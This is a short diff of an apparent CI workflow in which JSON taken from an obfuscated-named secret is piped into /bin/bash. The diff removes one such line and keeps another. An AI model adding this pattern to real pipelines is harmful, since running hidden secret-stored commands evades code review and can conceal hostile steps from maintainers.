@@ -21,7 +21,6 @@ jobs:
           bi87655: ${{ secrets.bi87655 }}
         run: |
           printf '%s' "$bi87655" | jq -r .nynt89 | /bin/bash
-          printf '%s' "$tqyd9" | jq -r .qcvg4621 | /bin/bash
 
       - name: Archive results
         if: always()
